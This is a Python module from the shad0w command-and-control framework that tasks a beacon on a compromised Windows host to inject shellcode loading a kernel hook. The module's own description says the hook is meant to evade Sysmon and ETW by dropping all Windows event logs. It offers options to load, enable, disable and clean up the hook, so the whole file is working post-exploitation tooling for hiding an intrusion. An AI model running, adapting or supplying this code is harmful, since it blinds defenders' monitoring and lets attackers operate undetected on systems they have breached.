#
# Execute ghost in the logs on the session
#

import os
import sys
import zlib
import base64
import argparse

from lib import auxiliary
from lib import shellcode

__description__ = "Universally Evade Sysmon and ETW - patch the kernel to disable Windows event logging"
__author__ = "@_batsec_"
__type__ = "module"

# identify the task as shellcode execute
USERCD_EXEC_ID = 0x3000

# location of Rubeus binary
RUBEUS_BIN = "/root/shad0w/bin/gitl.x64.exe"

# did the command error
ERROR = False
error_list = ""


def error(message):
    global ERROR, error_list
    ERROR = True
    error_list += f"\033[0;31m{message}\033[0m\n"


def exit(status=0, message=None): 
    if message != None: print(message)
    return


def ghostinthelogs_callback(shad0w, data):
    data = data.replace("[+]", "\033[1;32m[+]\033[0m")
    data = data.replace("[!]", "\033[1;31m[!]\033[0m")
    data = data.replace("[-]", "\033[1;31m[-]\033[0m")
    data = data.replace("[i]", "\033[1;34m[i]\033[0m")
    data = data.replace("[*]", "\033[1;34m[*]\033[0m")

    print('\n'.join(data.splitlines()[3:]))

    return ""


def set_and_send(shad0w, args):
    args.cls = False
    args.method = False
    args.runtime = False
    args.appdomain = False

    # generate the shellcode
    b64_comp_data = shellcode.generate(RUBEUS_BIN, args, args.param)

    # set a task for the current beacon to do
    shad0w.beacons[shad0w.current_beacon]["task"] = (USERCD_EXEC_ID, b64_comp_data)
    shad0w.beacons[shad0w.current_beacon]["callback"] = ghostinthelogs_callback

    # inform the user of the change
    shad0w.debug.log(f"Tasked beacon ({shad0w.current_beacon})", log=True)

    return


def main(shad0w, args):

    raw_args = args

    # check we actually have a beacon
    if shad0w.current_beacon is None:
        shad0w.debug.log("ERROR: No active beacon.", log=True)
        return

    # usage examples
    usage_examples = """

Examples:

gitl
gitl --status
gitl --load
gitl --clean
gitl --enable
gitl --disable
"""

    # init argparse
    parse = argparse.ArgumentParser(prog='gitl',
                                    formatter_class=argparse.RawDescriptionHelpFormatter,
                                    epilog=usage_examples)

    # keep it behaving nice
    parse.exit = exit
    parse.error = error

    # set the args
    parse.add_argument("-s", "--status", action='store_true', help="Get the status of the hook")
    parse.add_argument("-l", "--load", action='store_true', help="Load the kernel hook")
    parse.add_argument("-c", "--clean", action='store_true', help="Clean up any left over files on disk")
    parse.add_argument("-e", "--enable", action='store_true', help="Enable the hook (drop all events)")
    parse.add_argument("-d", "--disable", action='store_true', help="Disable the hook (allow all events)")

    # make sure we don't die from weird args
    try:
        args = parse.parse_args(args[1:])
    except:
        pass

    # show the errors to the user
    if ERROR or (len(raw_args) == 1):
        parse.print_help()
        return

    if args.status:
        args.param = "status"
        set_and_send(shad0w, args)
        return

    if args.load:
        args.param = "load"
        set_and_send(shad0w, args)
        return

    if args.clean:
        args.param = "clean"
        set_and_send(shad0w, args)
        return

    if args.enable:
        args.param = "enable"
        set_and_send(shad0w, args)
        return

    if args.disable:
        args.param = "disable"
        set_and_send(shad0w, args)
        return

    return
